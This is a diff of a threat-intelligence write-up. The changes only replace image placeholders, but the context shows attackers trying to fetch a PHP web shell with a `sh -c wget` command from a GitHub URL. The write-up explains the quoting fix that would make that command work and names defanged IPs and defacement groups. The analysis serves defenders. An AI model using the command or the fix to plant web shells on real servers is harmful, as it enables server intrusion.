@@ -22,7 +22,7 @@ We did observe the threat actors struggle with the non-interactive and non-login
 
 In this example, they are trying to download an interactive transparent web shell (`connected.php`) but don't seem to understand how the Linux shell interprets the non-interactive and non-login session when using `sh -c`. They were confused enough that they began running the `--help` option for `wget` on the system they were resident on.
 
-![alt_text](images/image1.png "image_tooltip")
+<img width="723" alt="image4" src="https://github.com/elastic/labs-releases/assets/7442091/a11c5c88-047b-417d-a3b9-c4670c1ac079">
 
 When using `sh -c`,  you need to surround your command with single quotes so that the shell interprets the instructions as a single command and an argument instead of multiple commands. In the example attempted by the adversary, they tried to use `sh -c wget https://raw.githubusercontent.com/LeviathanPerfectHunter/shell/main/connected[.]php` which is interpreted by the shell as two separate commands, `wget` and the URL, instead of a command (`wget`) and an argument (the URL). This fails because `wget` requires a URL as an argument. Because of the way the actor attempted to use `sh -c`, the URL was interpreted as another command and failed.
 
@@ -76,23 +76,23 @@ As stated above, the below section is to add some context to the indicators.
 
 One of the IP addresses that was used for a remote shell (`156.67.221[.]29`) also serves as a web page for a group called Leviathan Perfect Hunter (of note, this shares a name with the Github profile where `connected.php` is hosted). There are two websites for Leviathan Perfect Hunter, one is the IP address with no domain associated, and the other is `leviathanperfecthunter[.]site` (`142.132.150[.]169`).
 
-![alt_text](images/image2.png "image_tooltip")
+![image1](https://github.com/elastic/labs-releases/assets/7442091/c73e4275-3cc1-48a2-8e3b-a9430a86935c)
 
 The Leviathan Perfect Hunter team appears to focus on web server exploitation and defacement. This team uploaded a single defacement in February 2023 on the website vandalism site, Zone-Xsec.
 
-![alt_text](images/image3.png "image_tooltip")
+<img width="913" alt="image8" src="https://github.com/elastic/labs-releases/assets/7442091/2faa45fd-231b-4076-925e-289640352cb4">
 
 When researching `142.132.150[.]169` (the IP address for the `leviathianperfecthunter[.]site`) we identified that it had also been defaced and posted on Zone-Xsec by a team called “padang blackhat”, from the user _xjustfun.
 
-![alt_text](images/image4.png "image_tooltip")
+![image3](https://github.com/elastic/labs-releases/assets/7442091/64bec0ec-ba3d-4cdb-b7d5-3554be421e95)
 
 User _xjustfun was an attacker who posted their last defacement to Zone-Xsec in March of 2023.
 
-![alt_text](images/image5.png "image_tooltip")
+![image6](https://github.com/elastic/labs-releases/assets/7442091/0773ef12-6821-468b-84b0-1a9b52d6d4f1)
 
 The team “padang blackhat” posted their last defacement to Zone-Xsec in May of 2023. As of this publication, they have recorded 2,124 defacements to Zone-Xsec
 
-![alt_text](images/image6.png "image_tooltip")
+![image2](https://github.com/elastic/labs-releases/assets/7442091/2c697951-014c-4587-ba03-a554833efad8)
 
 It is unclear if _xjustfun, padang blackhat, or Leviathan Perfect Hunter are related or engaged in hacker chicanery. Padang blackhat may be a top-level defacement group, _xjustfun is a member, and Leviathan Perfect Hunter is a project owned by them.
 
@@ -129,9 +129,9 @@ suhao.github.io.	3600	IN	A	185.199.111.153
 
 When analyzing the available hosts and subdomains of `co[.]ws`, we observed that they were seemingly a hopper of defaced websites. 321 sites returned an HTTP response code of `404` and 21 returned a `200`. Below are a few examples.
 
-![alt_text](images/image7.png "image_tooltip")
+<img width="690" alt="image7" src="https://github.com/elastic/labs-releases/assets/7442091/c5d1886b-4af1-47f1-89a7-d79a5b376952">
 
-![alt_text](images/image8.png "image_tooltip")
+<img width="735" alt="image5" src="https://github.com/elastic/labs-releases/assets/7442091/86c3f4f4-dc7e-48ba-8a9b-16860fe7ead1">
 
 This could be a red team training ground, a mirror of defacements hosted elsewhere, a portfolio showcasing hacker skillsets, a honeynet, or something different entirely. 
 
